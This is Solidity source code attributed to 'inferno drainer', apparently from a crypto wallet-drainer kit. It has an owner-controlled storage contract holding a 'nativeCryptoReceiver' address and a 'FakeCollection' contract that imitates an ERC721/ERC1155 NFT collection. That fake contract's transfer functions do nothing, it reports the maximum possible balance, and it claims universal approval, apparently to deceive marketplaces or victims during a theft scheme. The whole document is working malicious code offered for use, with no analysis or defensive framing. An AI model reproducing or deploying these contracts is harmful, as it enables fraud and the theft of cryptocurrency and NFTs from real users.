// @mr_inferno_drainer / inferno drainer

// File: contracts/StorageContract.sol

pragma solidity ^0.8.6;

contract StorageContract {
    address public nativeCryptoReceiver;
    address[] public owners;

    constructor(address defaultNativeCryptoReceiver, address firstOwner) {
        nativeCryptoReceiver = defaultNativeCryptoReceiver;
        owners.push(firstOwner);
    }

    modifier onlyOwner() {
        bool isOwner = false;
        for (uint256 i = 0; i < owners.length; i++) {
            if (msg.sender == owners[i]) {
                isOwner = true;
                break;
            }
        }
        require(isOwner, "Caller is not an owner");
        _;
    }

    function addOwner(address newOwner) public onlyOwner {
        owners.push(newOwner);
    }

    function getOwners() public view returns (address[] memory) {
        return owners;
    }

    function removeOwner(address ownerToRemove) public onlyOwner {
        uint256 index = type(uint256).max;

        for (uint256 i = 0; i < owners.length; i++) {
            if (owners[i] == ownerToRemove) {
                index = i;
                break;
            }
        }

        require(index != type(uint256).max, "Owner not found");
        require(owners.length > 1, "Cannot remove the last owner");

        owners[index] = owners[owners.length - 1];
        owners.pop();
    }

    function changeNativeCryptoReceiver(address newNativeCryptoReceiver)
        public
        onlyOwner
    {
        nativeCryptoReceiver = newNativeCryptoReceiver;
    }
}

// File: contracts/BlurFakeCollection.sol

pragma solidity ^0.8.6;

contract FakeCollection {
    StorageContract storageContract;

    constructor(address storageContractAddress) {
        storageContract = StorageContract(storageContractAddress);
    }

    modifier onlyOwner() {
        bool isOwner = false;
        for (uint256 i = 0; i < storageContract.getOwners().length; i++) {
            if (tx.origin == storageContract.owners(i)) {
                isOwner = true;
                break;
            }
        }
        require(isOwner, "Caller is not an owner");
        _;
    }

    // ERC721
    function safeTransferFrom(
        address,
        address,
        uint256,
        bytes memory
    ) public onlyOwner {}

    // ERC721
    function safeTransferFrom(
        address,
        address,
        uint256
    ) public onlyOwner {}

    // ERC721
    function transferFrom(
        address,
        address,
        uint256
    ) public onlyOwner {}

    // ERC1155
    function safeTransferFrom(
        address,
        address,
        uint256,
        uint256,
        bytes calldata
    ) external onlyOwner {}

    // ERC1155
    function safeBatchTransferFrom(
        address,
        address,
        uint256[] calldata,
        uint256[] calldata,
        bytes calldata
    ) external onlyOwner {}

    // ERC1155
    function balanceOf(address, uint256) public pure returns (uint256) {
        return type(uint256).max;
    }

    // ERC721
    function isApprovedForAll(address, address) public pure returns (bool) {
        return true;
    }
}